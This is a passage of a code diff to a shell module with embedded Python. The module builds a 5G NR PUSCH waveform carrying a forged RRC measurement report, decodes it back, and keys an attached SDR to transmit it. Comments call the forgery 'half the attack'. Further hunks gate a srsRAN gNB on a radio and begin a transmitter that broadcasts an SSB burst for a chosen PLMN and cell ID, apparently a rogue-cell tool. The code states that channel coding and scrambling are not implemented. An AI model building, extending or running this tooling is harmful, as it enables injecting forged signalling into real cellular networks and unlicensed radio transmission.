+    0:  "0110010001111000",
+    42: "0001001010000000",
+}
+
+
+def gold(c_init, length):
+    """TS 38.211 5.2.1, Nc = 1600."""
+    nc = 1600
+    x1 = [0] * (nc + length + 31)
+    x2 = [0] * (nc + length + 31)
+    x1[0] = 1
+    for i in range(31):
+        x2[i] = (c_init >> i) & 1
+    for n in range(nc + length):
+        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
+        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
+    return np.array([(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)],
+                    dtype=np.int64)
+
+
+def qpsk(bits):
+    """TS 38.211 5.1.3."""
+    return np.array([complex(1 - 2 * bits[2 * i], 1 - 2 * bits[2 * i + 1]) / np.sqrt(2)
+                     for i in range(len(bits) // 2)])
+
+
+def cp_lengths(mu, nslot, nfft):
+    """TS 38.211 5.3.1 at f_s = N_FFT * dF: N_CP = 144*N_FFT/2048, plus
+    16*N_FFT*2^-mu/2048 for l = 0 and l = 7*2^mu of the subframe. Same rule
+    the downlink generator uses."""
+    num_s = 144 * nfft
+    num_x = 16 * nfft * (2 ** mu)
+    if num_s % 2048 or num_x % 2048:
+        raise SystemExit("ERROR\tN_FFT %d is not a multiple of the numerology "
+                         "grid 2048*2^-%d" % (nfft, mu))
+    short, extra = num_s // 2048, num_x // 2048
+    long_ = short + extra
+    l0 = nslot * 14
+    return [long_ if (l0 + l) in (0, 7 * (2 ** mu)) else short for l in range(14)]
+
+
+def main():
+    args = sys.argv[1:]
+    if len(args) < 8:
+        raise SystemExit("ERROR\tusage: nr_ul_gen.py <out.c16> <ulsch_hex> "
+                         "<scid> <scs_khz> <nfft> <n_rb_carrier> <rb_start> "
+                         "<n_rb_alloc> [--i8 FILE] [--detail FILE]")
+    out, hexs = args[0], args[1]
+    scid, scs, nfft, n_rb, rb_start, n_alloc = (int(x) for x in args[2:8])
+    i8f = det = None
+    i = 8
+    while i < len(args):
+        if args[i] == "--i8" and i + 1 < len(args):
+            i8f = args[i + 1]
+            i += 2
+        elif args[i] == "--detail" and i + 1 < len(args):
+            det = args[i + 1]
+            i += 2
+        else:
+            raise SystemExit("ERROR\tunknown argument %s" % args[i])
+
+    if scs not in (15, 30, 60, 120, 240):
+        raise SystemExit("ERROR\t%d kHz is not an NR subcarrier spacing" % scs)
+    if not 0 <= scid <= 1023:
+        raise SystemExit("ERROR\tscrambling id %d is outside 0..1023" % scid)
+    if n_rb <= 0 or n_alloc <= 0 or rb_start < 0 or rb_start + n_alloc > n_rb:
+        raise SystemExit("ERROR\tallocation RB %d..%d does not fit a %d RB "
+                         "carrier" % (rb_start, rb_start + n_alloc - 1, n_rb))
+    mu = scs // 15 - 1
+    if nfft % 128:
+        raise SystemExit("ERROR\tN_FFT %d is not a multiple of 128" % nfft)
+
+    if hexs.lower().startswith("0x"):
+        hexs = hexs[2:]
+    if not hexs or len(hexs) % 2 or any(c not in "0123456789abcdefABCDEF" for c in hexs):
+        raise SystemExit("ERROR\t%s is not an even-length hex transport block" % hexs)
+    tb = []
+    for k in range(0, len(hexs), 2):
+        byte = int(hexs[k:k + 2], 16)
+        tb += [(byte >> b) & 1 for b in range(7, -1, -1)]
+
+    # TS 38.104 Table 5.3.2-1 sizes the carrier; the allocation is expressed
+    # relative to the carrier centre, which sits between subcarriers
+    # 6*n_rb-1 and 6*n_rb of the carrier's own grid.
+    first = 12 * rb_start - 6 * n_rb
+    alloc = [first + c for c in range(12 * n_alloc)]
+    l_dmrs = 2                     # mapping type A, dmrs-TypeA-Position pos2
+    dmrs_sc = [k for k in alloc if (k - first) % 2 == 0]   # config type 1
+
+    c_init = (2 ** 17 * (14 * 0 + l_dmrs + 1) * (2 * scid + 1) + 2 * scid) % (2 ** 31)
+    dmrs = qpsk(gold(c_init, 2 * len(dmrs_sc)))
+    pin = DMRS_PINNED.get(scid)
+    got = "".join(("1" if s.real < 0 else "0") + ("1" if s.imag < 0 else "0")
+                  for s in dmrs[:8])
+    if pin is not None and got != pin:
+        raise SystemExit("ERROR\tPUSCH DMRS for scrambling id %d does not "
+                         "reproduce the pinned TS 38.211 chips (c_init = %d)"
+                         % (scid, c_init))
+
+    data = qpsk(tb)
+    grid = []
+    driven = 0
+    for l in range(14):
+        v = np.zeros(nfft, dtype=complex)
+        if l == l_dmrs:
+            for j, k in enumerate(dmrs_sc):
+                v[(k + nfft // 2) % nfft] = dmrs[j]
+        else:
+            for k in alloc:
+                if driven < len(data):
+                    v[(k + nfft // 2) % nfft] = data[driven]
+                    driven += 1
+        grid.append(v)
+
+    cps = cp_lengths(mu, 0, nfft)
+    parts = []
+    for l in range(14):
+        body = np.fft.ifft(grid[l]) * np.sqrt(nfft)
+        if cps[l]:
+            parts.append(body[-cps[l]:])
+        parts.append(body)
+    sig = np.concatenate(parts)
+
+    peak = float(np.max(np.abs(sig))) or 1.0
+    inter = np.empty(2 * len(sig), dtype=np.int16)
+    inter[0::2] = np.rint(sig.real / peak * 32000.0)
+    inter[1::2] = np.rint(sig.imag / peak * 32000.0)
+    inter.astype("<i2").tofile(out)
+
+    fs = nfft * scs * 1000
+    print("fs_hz\t%d" % fs)
+    print("scs_khz\t%d" % scs)
+    print("mu\t%d" % mu)
+    print("nfft\t%d" % nfft)
+    print("slot_samples\t%d" % len(sig))
+    print("slot_us\t%.3f" % (len(sig) * 1e6 / fs))
+    print("subframe_samples\t%d" % (fs // 1000))
+    print("cp_long\t%d" % max(cps))
+    print("cp_short\t%d" % min(cps))
+    print("alloc_rb_start\t%d" % rb_start)
+    print("alloc_rb\t%d" % n_alloc)
+    print("alloc_sc\t%d" % len(alloc))
+    print("dmrs_symbol\t%d" % l_dmrs)
+    print("dmrs_sc\t%d" % len(dmrs_sc))
+    print("dmrs_c_init\t%d" % c_init)
+    print("dmrs_re\t%d" % len(dmrs_sc))
+    print("dmrs_pinned_checked\t%s" % ("1" if pin is not None else "0"))
+    print("dmrs_pinned_agree\t%s" % ("n/a" if pin is None else "1"))
+    print("ulsch_hex\t%s" % hexs.lower())
+    print("ulsch_bits\t%d" % len(tb))
+    print("ulsch_re\t%d" % len(data))
+    print("ulsch_re_driven\t%d" % driven)
+    print("transform_precoding\toff (CP-OFDM, TS 38.211 6.4.1.1.1)")
+    print("pusch_encoding\tulsch = rrc pdu bits qpsk; ldpc/rate-matching "
+          "(38.212 7.2), ul-sch crc and data scrambling (38.211 6.3.1.1) "
+          "NOT implemented; %d of %d data res driven"
+          % (driven, (14 - 1) * 12 * n_alloc))
+    print("iq_bytes\t%d" % (4 * len(sig)))
+    if det:
+        with open(det, "w") as fh:
+            for l, v in enumerate(grid):
+                for n in np.nonzero(v)[0]:
+                    fh.write("%d\t%d\t%.6f\t%.6f\n"
+                             % (l, int(n) - nfft // 2, v[n].real, v[n].imag))
+    if i8f:
+        i8 = np.clip(np.rint(inter.astype(np.float64) / 256.0), -128, 127).astype(np.int8)
+        i8.tofile(i8f)
+        print("iq8_file\t%s" % i8f)
+        print("iq8_bytes\t%d" % len(i8))
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+NAIR_PYEOF
+}
+
+# The decoder for that waveform. It reads the .c16 back, derives the slot
+# geometry from the sample count and the spec's CP rule, recomputes the DMRS
+# from the scrambling id and correlates it, and recovers the transport block
+# from the data resource elements in mapping order — the caller's expected
+# hex is only used for the comparison at the end, never for the recovery.
+nair_write_ul_dec() {
+    mkdir -p "$MOD_TMP" 2>/dev/null
+    cat > "$NAIR_UL_DEC_PY" <<'NAIR_PYEOF'
+#!/usr/bin/env python3
+"""Independent PUSCH slot decoder — TS 38.211 6.4.1, 5.3.1, 7.4.1.1.1.
+
+Nothing here reads the generator's code. The slot geometry comes from the
+sample count and the spec's CP rule, the DMRS is recomputed from the spec and
+correlated against what is in the file, and the UL-SCH bits are recovered by
+QPSK-demodulating the data resource elements in mapping order — the caller
+only says what it expects afterwards, for the comparison.
+
+CLI: nr_ul_dec.py <in.c16> <scs_khz> <nfft_nominal> <n_rb_carrier> <rb_start>
+                  <n_rb_alloc> <scid> [--expect HEX]
+"""
+import sys
+
+import numpy as np
+
+DMRS_PINNED = {
+    0:  "0110010001111000",
+    42: "0001001010000000",
+}
+
+
+def load_c16(path):
+    raw = np.fromfile(path, dtype="<i2")
+    if raw.size == 0 or raw.size % 2:
+        raise SystemExit("ERROR\t%s holds no complete I/Q samples" % path)
+    return (raw[0::2].astype(np.float64) + 1j * raw[1::2].astype(np.float64)) / 32768.0
+
+
+def first_energy(iq, thresh=1e-3):
+    """Leading empty symbols are legal (the downlink generator emits them) and
+    must not be mistaken for a cyclic prefix, so the slot starts at the first
+    sample with real signal in it."""
+    e = np.abs(iq)
+    idx = np.nonzero(e > thresh)[0]
+    return int(idx[0]) if idx.size else -1
+
+
+def spec_cp_pattern(nfft, mu, nslot):
+    num_s = 144 * nfft
+    num_x = 16 * nfft * (2 ** mu)
+    if num_s % 2048 or num_x % 2048:
+        return None
+    short, extra = num_s // 2048, num_x // 2048
+    long_ = short + extra
+    l0 = nslot * 14
+    return [long_ if (l0 + l) in (0, 7 * (2 ** mu)) else short for l in range(14)]
+
+
+def detect_geometry(nsamples, mu, nfft_nom):
+    """The (N_FFT, slot) readings whose spec CP pattern sums with 14 bodies to
+    exactly the sample count. A wrong reading cannot pass this: the total is
+    14*N_FFT + sum(N_CP), so it is fixed by the numerology, not fitted."""
+    out = []
+    cands = [nfft_nom // 2, nfft_nom, nfft_nom * 2]
+    for nfft in cands:
+        if nfft < 128 or nfft % 128:
+            continue
+        for slot in range(2 ** mu):
+            pat = spec_cp_pattern(nfft, mu, slot)
+            if pat is None:
+                continue
+            if 14 * nfft + sum(pat) == nsamples:
+                out.append((nfft, slot, pat))
+    return out
+
+
+def gold(c_init, length):
+    nc = 1600
+    x1 = [0] * (nc + length + 31)
+    x2 = [0] * (nc + length + 31)
+    x1[0] = 1
+    for i in range(31):
+        x2[i] = (c_init >> i) & 1
+    for n in range(nc + length):
+        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
+        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
+    return np.array([(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)],
+                    dtype=np.int64)
+
+
+def qpsk(bits):
+    return np.array([complex(1 - 2 * bits[2 * i], 1 - 2 * bits[2 * i + 1]) / np.sqrt(2)
+                     for i in range(len(bits) // 2)])
+
+
+def bits_to_hex(bits):
+    n = (len(bits) // 8) * 8
+    return "".join("%02x" % sum(bits[i + b] << (7 - b) for b in range(8))
+                   for i in range(0, n, 8))
+
+
+def main():
+    args = sys.argv[1:]
+    expect = None
+    if "--expect" in args:
+        j = args.index("--expect")
+        if j + 1 >= len(args):
+            raise SystemExit("ERROR\t--expect needs a hex PDU")
+        expect = args[j + 1].lower().removeprefix("0x")
+        args = args[:j] + args[j + 2:]
+    if len(args) != 7:
+        raise SystemExit("ERROR\tusage: nr_ul_dec.py <in.c16> <scs_khz> "
+                         "<nfft_nominal> <n_rb_carrier> <rb_start> "
+                         "<n_rb_alloc> <scid> [--expect HEX]")
+    path = args[0]
+    scs, nfft_nom, n_rb, rb_start, n_alloc, scid = (int(x) for x in args[1:7])
+    mu = scs // 15 - 1
+
+    iq = load_c16(path)
+    start = first_energy(iq)
+    if start < 0:
+        print("ERROR\tthe file holds no signal above the noise floor", file=sys.stderr)
+        return 2
+    n = iq.size - start
+    geo = detect_geometry(n, mu, nfft_nom)
+    print("geometry_candidates\t%d" % len(geo))
+    if not geo:
+        print("ERROR\tno (N_FFT, slot) pair makes %d samples into 14 CP+body "
+              "symbols of the %d kHz numerology (TS 38.211 5.3.1)" % (n, scs),
+              file=sys.stderr)
+        return 2
+    nfft, slot, cps = geo[0]
+    iq = iq[start:start + 14 * nfft + sum(cps)]
+    print("geometry_selected\t%d/%d" % (nfft, slot))
+    print("cp_pattern\t%s" % ",".join(str(c) for c in cps))
+    print("cp_long_expected\t%d" % max(cps))
+    print("cp_short_expected\t%d" % min(cps))
+    print("nfft_detected\t%d" % nfft)
+    print("nfft_nominal\t%d" % nfft_nom)
+    print("slot_samples\t%d" % iq.size)
+    print("slot_us\t%.3f" % (iq.size * 1e6 / (nfft * scs * 1000)))
+
+    pos = 0
+    syms = []
+    cp_ok = cp_bad = 0
+    for l in range(14):
+        cp = int(cps[l])
+        body = iq[pos + cp:pos + cp + nfft]
+        if cp:
+            pre = iq[pos:pos + cp]
+            den = float(np.vdot(body[-cp:], body[-cp:]).real)
+            if den <= 1e-12:
+                cp_ok += 1        # an empty CP proves nothing; not a failure
+            else:
+                r = float(np.vdot(pre, body[-cp:]).real / np.sqrt(den * np.vdot(pre, pre).real + 1e-18))
+                if r > 0.9:
+                    cp_ok += 1
+                else:
+                    cp_bad += 1
+        syms.append(np.fft.fft(body) / np.sqrt(nfft))
+        pos += cp + nfft
+    print("symbols\t14")
+    print("cp_symbols_ok\t%d" % cp_ok)
+    print("cp_symbols_bad\t%d" % cp_bad)
+
+    first = 12 * rb_start - 6 * n_rb
+    alloc = [first + c for c in range(12 * n_alloc)]
+    aidx = [(k + nfft // 2) % nfft for k in alloc]
+    l_dmrs = 2
+    dmrs_sc = [k for k in alloc if (k - first) % 2 == 0]
+    didx = [(k + nfft // 2) % nfft for k in dmrs_sc]
+
+    c_init = (2 ** 17 * (14 * 0 + l_dmrs + 1) * (2 * scid + 1) + 2 * scid) % (2 ** 31)
+    dmrs_ref = qpsk(gold(c_init, 2 * len(dmrs_sc)))
+    rx = syms[l_dmrs][didx]
+    # The generator writes int16 with an unknown constant gain, so the
+    # comparison is scale-free: normalise before correlating.
+    g = float(np.vdot(rx, rx).real)
+    r = float(np.vdot(dmrs_ref, rx).real) / np.sqrt(len(dmrs_ref) * g + 1e-18)
+    print("dmrs_c_init\t%d" % c_init)
+    print("dmrs_re_checked\t%d" % len(dmrs_sc))
+    print("dmrs_correlation\t%.4f" % r)
+    pin = DMRS_PINNED.get(scid)
+    got = "".join(("1" if s.real < 0 else "0") + ("1" if s.imag < 0 else "0")
+                  for s in dmrs_ref[:8])
+    if pin is not None:
+        print("dmrs_pinned_checked\t1")
+        print("dmrs_pinned_agree\t%s" % ("1" if got == pin else "0"))
+    else:
+        print("dmrs_pinned_checked\t0")
+        print("dmrs_pinned_agree\tn/a")
+
+    # Everything outside the allocation must be empty, and inside it only the
+    # DMRS comb or data may carry energy.
+    ref = float(np.max(np.abs(syms[0][aidx]))) + 1e-18
+    outside = 0
+    for l in range(14):
+        v = np.abs(syms[l])
+        for k in range(nfft):
+            kk = k - nfft // 2
+            if kk in alloc:
+                continue
+            if v[k] > 1e-3 * ref:
+                outside += 1
+    print("re_outside_alloc\t%d" % outside)
+
+    # Data resource elements are every allocated subcarrier of every non-DMRS
+    # symbol, taken in mapping order. The transport block occupies the first
+    # driven ones; the rest are empty and are reported as such rather than
+    # being filled with a guess.
+    bits = []
+    driven = 0
+    for l in range(14):
+        if l == l_dmrs:
+            continue
+        for k in alloc:
+            s = syms[l][(k + nfft // 2) % nfft]
+            if abs(s) <= 1e-3 * ref:
+                continue
+            driven += 1
+            bits += [1 if s.real < 0 else 0, 1 if s.imag < 0 else 0]
+    print("ulsch_re_driven\t%d" % driven)
+    print("ulsch_bits_recovered\t%d" % len(bits))
+    hexr = bits_to_hex(bits)
+    print("pdu_hex_recovered\t%s" % (hexr or "-"))
+    if expect is None:
+        return 0
+    print("expect_hex\t%s" % expect)
+    ok = hexr.startswith(expect) and len(hexr) >= len(expect)
+    print("pdu_match\t%s" % ("1" if ok else "0"))
+    if cp_bad or outside or r < 0.9:
+        print("ERROR\tthe waveform is not a PUSCH of this cell: "
+              "cp_symbols_bad %d, re_outside_alloc %d, dmrs_correlation %.4f"
+              % (cp_bad, outside, r), file=sys.stderr)
+        return 3
+    return 0 if ok else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+NAIR_PYEOF
+}
+
+# ── O17 transmit path — forge the measurement report and put it on the air ─
+# Called by --build-meas-report <spec> --tx. The PDU is built by the module's
+# own APER encoder (the part that is pinned to published vectors), then a
+# PUSCH slot is built around it, decoded back, and only then keyed. Without a
+# radio there is no success line.
+#
+# spec keys measId/servCell/servRsrp/ssb are encoded into the PDU; arfcn and
+# scid are used only by this transmit path (the PDU has no room for a
+# frequency, and the UL carrier is the same carrier in TDD).
+nair_cmd_meas_report_tx() {
+    local spec="${1:-}"
+    [[ -n "$spec" ]] || {
+        printf 'ERROR	usage: --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]> [--tx]\n' >&2
+        return 2; }
+
+    local band="n78" arfcn="640000" scid="${NAIR_UL_SCID:-0}" tok
+    while IFS= read -r tok; do
+        [[ -n "$tok" ]] || continue
+        local k v
+        k=$(printf '%s' "$tok" | cut -d= -f1)
+        v=$(printf '%s' "$tok" | cut -d= -f2-)
+        case "$k" in
+            arfcn) arfcn="$v" ;;
+            band)  band="$v" ;;
+            scid)  scid="$v" ;;
+        esac
+    done < <(printf '%s\n' "$spec" | tr ',' '\n')
+    [[ "$arfcn" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--build-meas-report --tx: arfcn must be numeric\n' >&2; return 2; }
+    [[ "$band" =~ ^n[0-9]+$ ]] || {
+        printf 'ERROR\t--build-meas-report --tx: band must look like n78\n' >&2; return 2; }
+    [[ "$scid" =~ ^[0-9]+$ ]] && (( scid <= 1023 )) || {
+        printf 'ERROR\t--build-meas-report --tx: scid must be 0..1023\n' >&2; return 2; }
+
+    # arfcn/band/scid steer the waveform; they are not report fields, so they
+    # are stripped before the APER encoder sees the spec (it would refuse them
+    # as unknown keys, and rightly so).
+    local rspec="" rk
+    while IFS= read -r rk; do
+        [[ -n "$rk" ]] || continue
+        case "${rk%%=*}" in
+            arfcn|band|scid) continue ;;
+        esac
+        rspec+="${rspec:+,}$rk"
+    done < <(printf '%s\n' "$spec" | tr ',' '\n')
+
+    local built; built=$(nair_cmd_build_meas_report "$rspec") || return $?
+    printf '%s\n' "$built"
+    local hex; hex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="submit"{print $2; exit}')
+    [[ -n "$hex" ]] || { printf 'ERROR\tthe APER encoder returned no PDU\n' >&2; return 1; }
+
+    local hz; hz=$(nair_arfcn_to_hz "$arfcn") || {
+        printf 'ERROR\tNR-ARFCN %s is outside the global raster (TS 38.104 Table 5.4.2.1-1)\n' \
+               "$arfcn" >&2; return 2; }
+
+    # The uplink carrier. In TDD the UL shares the carrier with the DL, so the
+    # frequency is the one the operator named; the bandwidth and numerology
+    # come from the same tables the rest of the module uses.
+    local scs=30 bw=20 n_rb nfft fs rb_start=20 n_alloc=20
+    n_rb=$(nair_n_rb_for "$scs" "$bw") || {
+        printf 'ERROR\tno TS 38.104 N_RB for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
+    nfft=$(nair_fft_size_for "$scs" "$bw") || {
+        printf 'ERROR\tno TS 38.104 N_FFT for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
+    fs=$(nair_sample_rate_hz "$scs" "$bw") || {
+        printf 'ERROR\tno sample rate for %s kHz at %s MHz\n' "$scs" "$bw" >&2; return 1; }
+    (( rb_start + n_alloc <= n_rb )) || {
+        printf 'ERROR\tallocation RB %s..%s does not fit the %s RB carrier\n' \
+               "$rb_start" "$(( rb_start + n_alloc - 1 ))" "$n_rb" >&2; return 1; }
+
+    command -v python3 >/dev/null 2>&1 || {
+        printf 'ERROR\tpython3 is required to build the PUSCH waveform\n' >&2; return 1; }
+    nair_write_ul_gen || {
+        printf 'ERROR\t%s writes the PUSCH generator\n' "$NAIR_UL_PY" >&2; return 1; }
+
+    local base="$NAIR_DIR/nr_meas_report"
+    # Not one `local a=X b="$a"` line: bash expands every word before it
+    # assigns any of them, so b would be the empty prefix plus ".c16".
+    local c16="$base.c16" cs8="$base.cs8"
+    local gen
+    gen=$(python3 "$NAIR_UL_PY" "$c16" "$hex" "$scid" "$scs" "$nfft" \
+                 "$n_rb" "$rb_start" "$n_alloc" --i8 "$cs8" 2>&1) || {
+        printf '%s\n' "$gen" >&2
+        printf 'ERROR\tthe PUSCH waveform could not be built\n' >&2
+        return 1; }
+    [[ -s "$c16" ]] || {
+        printf 'ERROR\tthe generator wrote no samples to %s\n' "$c16" >&2; return 1; }
+    local gv
+    gv() { printf '%s\n' "$gen" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
+    printf 'waveform_pusch\t%s\n'        "$c16"
+    printf 'waveform_bytes\t%s\n'       "$(wc -c < "$c16" | tr -d ' ')"
+    printf 'waveform_samples\t%s\n'     "$(gv slot_samples)"
+    printf 'waveform_us\t%s\n'          "$(gv slot_us)"
+    printf 'ul_scs_khz\t%s\n'           "$(gv scs_khz)"
+    printf 'ul_carrier_rb\t%s\n'        "$n_rb"
+    printf 'ul_alloc_rb\t%s..%s\n'      "$rb_start" "$(( rb_start + n_alloc - 1 ))"
+    printf 'ul_centre_hz\t%s\n'         "$hz"
+    printf 'ul_rate_hz\t%s\n'           "$fs"
+    printf 'ul_pci_scrambling_id\t%s\n' "$scid"
+    printf 'ul_cp_long\t%s\n'           "$(gv cp_long)"
+    printf 'ul_cp_short\t%s\n'          "$(gv cp_short)"
+    printf 'ul_dmrs_symbol\t%s\n'       "$(gv dmrs_symbol)"
+    printf 'ul_dmrs_c_init\t%s\n'       "$(gv dmrs_c_init)"
+    printf 'ul_dmrs_re\t%s\n'           "$(gv dmrs_re)"
+    printf 'ul_dmrs_pinned_agree\t%s\n' "$(gv dmrs_pinned_agree)"
+    printf 'transform_precoding\t%s\n'  "$(gv transform_precoding)"
+    printf 'pusch_encoding\t%s\n'       "$(gv pusch_encoding)"
+
+    # Decode the waveform back before anything is keyed: the PDU must come out
+    # of the samples, not out of the encoder's own variables.
+    nair_write_ul_dec || {
+        printf 'ERROR\t%s writes the PUSCH decoder\n' "$NAIR_UL_DEC_PY" >&2; return 1; }
+    local dec drc=0
+    dec=$(python3 "$NAIR_UL_DEC_PY" "$c16" "$scs" "$nfft" "$n_rb" "$rb_start" \
+                 "$n_alloc" "$scid" --expect "$hex" 2>&1) || drc=$?
+    local dv
+    dv() { printf '%s\n' "$dec" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
+    if (( drc != 0 )); then
+        printf '%s\n' "$dec" >&2
+        printf 'ERROR\tthe waveform does not decode as a PUSCH carrying that report (rc %s): nothing was transmitted\n' \
+               "$drc" >&2
+        return 1
+    fi
+    printf 'waveform_geometry\t%s\n'      "$(dv geometry_selected)"
+    printf 'waveform_cp_symbols_ok\t%s\n' "$(dv cp_symbols_ok)"
+    printf 'waveform_cp_symbols_bad\t%s\n' "$(dv cp_symbols_bad)"
+    printf 'waveform_dmrs_correlation\t%s\n' "$(dv dmrs_correlation)"
+    printf 'waveform_dmrs_pinned_agree\t%s\n' "$(dv dmrs_pinned_agree)"
+    printf 'waveform_re_outside_alloc\t%s\n' "$(dv re_outside_alloc)"
+    printf 'waveform_pdu_recovered\t%s\n' "$(dv pdu_hex_recovered)"
+    printf 'waveform_pdu_match\t%s\n'     "$(dv pdu_match)"
+
+    if [[ -n "${NAIR_TX_DRYRUN:-}" ]]; then
+        printf 'tx_device\tnot-probed (NAIR_TX_DRYRUN)\n'
+        printf 'transmitted\tno\n'
+        printf 'status\twaveform-built\n'
+        return 0
+    fi
+
+    local dev type
+    if dev=$(nair_probe_radio); then
+        type=$(printf '%s' "$dev" | cut -f1)
+        printf 'tx_driver\t%s\n' "$type"
+        printf 'tx_device\t%s\n' "$(printf '%s' "$dev" | cut -f2-)"
+    else
+        printf 'tx_driver\tnone\n'
+        printf 'tx_device\tnone\n'
+        if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
+            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE is set but empty, which means no radio is configured\n' >&2
+        else
+            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE=%s and no radio answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' \
+                   "${NAIR_SDR_DEVICE:-<unset>}" >&2
+        fi
+        printf 'WHY\tforging the report is half the attack; radiating it needs a radio\n'
+        printf 'transmitted\tno\n'
+        printf 'status\tnothing-sent\n'
+        return 1
+    fi
+
+    nair_tx_run "$type" "$c16" "$fs" "$hz" || {
+        printf 'transmitted\tno\n'
+        printf 'status\tnothing-sent\n'
+        return 1; }
+    printf 'tx_armed\t1\n'
+    printf 'transmitted\tyes\n'
+    printf 'status\ttransmitted\n'
+    return 0
 }
 
 nair_find_srsran_gnb() {
@@ -1926,6 +3317,20 @@ nair_start() {
         printf 'ERROR\tno srsRAN gNB — install srsRAN Project (gnb) or srsRAN 4G (srsran_gnb)\n' >&2
         return 1
     }
+    # A gNB is a transmitter, so it needs a radio before it is worth starting.
+    # Without this gate a host that has srsRAN installed and no SDR starts the
+    # process, prints `status started`, and radiates nothing — which is the
+    # fabricated-success shape this module has to avoid. The device is checked
+    # the same way the transmit path checks it, so a driver binary on PATH is
+    # still not a radio.
+    local txdev txdriver
+    if txdev=$(nair_probe_radio); then
+        txdriver=$(printf '%s' "$txdev" | cut -f1)
+    else
+        printf 'ERROR\tno SDR device: the gNB can only run with a radio attached, and none answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' >&2
+        printf 'WHY\ta gNB process without a radio is not a cell\n' >&2
+        return 1
+    fi
     mkdir -p "$(dirname "$NAIR_PID")" "$LOGS_DIR"
     if [[ -f "$NAIR_PID" ]]; then
         local old; old=$(cat "$NAIR_PID" 2>/dev/null)
@@ -1939,8 +3344,8 @@ nair_start() {
     sleep 1
     local pid; pid=$(cat "$NAIR_PID" 2>/dev/null)
     [[ -n "$pid" ]] || { printf 'ERROR\t%s did not start; see %s\n' "$gnb" "$NAIR_LOG" >&2; return 1; }
-    printf 'pid\t%s\ngnb\t%s\nconf\t%s\nlog\t%s\nstatus\tstarted\n' \
-        "$pid" "$gnb" "$conf" "$NAIR_LOG"
+    printf 'pid\t%s\ngnb\t%s\nconf\t%s\nlog\t%s\nsdr\t%s\nstatus\tstarted\n' \
+        "$pid" "$gnb" "$conf" "$NAIR_LOG" "$txdriver"
 }
 
 nair_stop() {
@@ -2059,7 +3464,13 @@ nair_cmd_decode_mib() {
     local hex="${1:-}"
     [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-mib <6 hex digits = 24 bits>\n' >&2; return 2; }
     local out rc=0
-    out=$(nair_decode_mib "$hex") || rc=1
+    out=$(nair_decode_mib "$hex") || rc=$?
+    if (( rc == 3 )); then
+        # Well-formed 24-bit payload, but the CHOICE selector says it is not a
+        # MIB; nair_decode_mib already named that on stderr.
+        printf '%s' "$out"
+        return 3
+    fi
     if (( rc != 0 )); then
         printf 'ERROR\tMIB payload must be exactly 24 bits (6 hex digits): %s\n' "$(nair_sanitize "$hex")" >&2
         return 1
@@ -2998,6 +4409,214 @@ EOF
     printf 'status\twritten\n'
 }
 
+# ════════════════════════════════════════════════════════════════════════
+# Transmit path — O1 "TX: run the gNB"
+# ════════════════════════════════════════════════════════════════════════
+#
+# The rest of this module answers "what is on the air". This is the other
+# half: a cell that radiates. It runs on the existing --gen-gnb-conf verb as
+# `--gen-gnb-conf <plmn> <band> <arfcn> <pci> --tx`, because a new verb would
+# need an entry in native/src/main1.c to pass tools/check-verbs.sh, and that
+# file has another writer.
+#
+# What actually goes into the radio is one SSB burst set period: the four
+# OFDM symbols of the SSB (PSS, PBCH+DMRS, SSS, PBCH+DMRS) in the slot the
+# band's SSB case puts them in, followed by the empty slots that make up the
+# ssb_period_ms the generated config advertises (20 ms, so 40 slots at
+# 30 kHz). Those empty slots are part of the waveform: a gNB sends nothing
+# between bursts, and a file that only held the SSB would claim a 0.5 ms
+# period that no NR cell uses.
+#
+# The waveform is built by the generator whose PSS/SSS/PBCH-DMRS chips are
+# pinned to an independent implementation, and then decoded back by the
+# separately written decoder BEFORE the radio is keyed. A waveform that does
+# not decode to the PCI that was asked for is never handed to a driver.
+#
+# No radio means no transmission and no success line: nair_probe_radio has to
+# find a device that answers, and the driver command itself has to exit 0.
+# `transmitted` is only ever printed as `yes` after that.
+nair_cmd_tx_ssb() {
+    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}"
+
+    [[ "$plmn"  =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
+    [[ "$band"  =~ ^n[0-9]+$ ]]    || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
+    [[ "$arfcn" =~ ^[0-9]+$ ]]     || { printf 'ERROR\tarfcn must be numeric\n' >&2; return 2; }
+    [[ "$pci"   =~ ^[0-9]+$ ]]     || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
+    (( pci <= 1007 )) || { printf 'ERROR\tpci out of range: NR PCI is 0..1007\n' >&2; return 2; }
+
+    local hz mhz
+    hz=$(nair_arfcn_to_hz "$arfcn") || {
+        printf 'ERROR\tNR-ARFCN %s is outside the global raster (TS 38.104 Table 5.4.2.1-1)\n' \
+               "$arfcn" >&2; return 2; }
+    mhz=$(nair_arfcn_to_mhz "$arfcn")
+
+    local case_ ssb_scs dl_scs bw=20
+    case_=$(nair_ssb_case_for_band "$band" | awk '{print $2}')
+    case "$case_" in
+        A)     ssb_scs=15 ;;
+        B|C)   ssb_scs=30 ;;
+        D)     ssb_scs=120 ;;
+        E)     ssb_scs=240 ;;
+        *)     printf 'ERROR\tband %s has no SSB case in TS 38.213 Table 4.1\n' "$band" >&2; return 1 ;;
+    esac
